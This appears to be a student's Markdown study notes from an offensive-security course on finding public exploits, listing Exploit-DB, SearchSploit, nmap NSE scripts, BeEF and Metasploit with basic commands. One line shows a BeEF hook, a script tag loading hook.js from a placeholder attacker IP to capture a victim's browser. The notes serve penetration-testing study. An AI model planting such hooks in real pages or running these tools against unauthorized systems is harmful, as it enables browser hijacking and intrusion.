# active-information-gathering

## Public Exploits
Public Exploits
- CAUTION downloading and running scripts can endanger any system
- Searching for exploits
  - Online
    - Exploit DB <https://www.exploit-db.com/>
    - SecurityFocus Exploit archives <https://bugtraq.securityfocus.com/archive>
    - Packet Storm <https://packetstormsecurity.com/>
    - Google 'Microsoft Edge site:exploit-db.com'
      - Some other search operators that can be used to fine-tune our searches include 'inurl', 'intext', and 'intitle'.
      - <https://ahrefs.com/blog/google-advanced-search-operators/>
  - Offline
    - SearchSploit - downloadable version of ExploitDB
      - ```shell sudo apt update && sudo apt install exploitdb```
      - contains two dirs ```shell ls -1 /usr/share/exploitdb/``` broken down into each operating system
      - usage
        - ```shell searchsploit```
        - ```shell searchsploit afd windows local```
        - ```shell searchsploit remote smb microsoft windows```
    - nmap NSE scripts
      - location is /usr/share/nmap/scripts
      - use grep to quickly find what you need
        - ```shell grep -i windows /usr/share/nmap/scripts/*.nse```
      - script help ```shell nmap --script-help=clamav-exec.nse```
    - Browser Exploitation Framework (BeEF)
      - start the required services ```shell sudo beef-xss```
      ![Alt text](kb/offsec/pen200/14-PublicExploits/image.png)
      - <http://127.0.0.1:3000/ui/panel>
      - use the hook.js script to capture the victims browser
        - html page contains ```html <script src="http://<IP>:3000/hook.js"></script>```
      - once hooked, the ip address will appear in the online browsers folder
    - Metasploit Framework
      - to start ```shell sudo msfconsole -q```
      - to search for exploit ```shell msf > search ms08_067```
      - help ```shell msf > search -h```
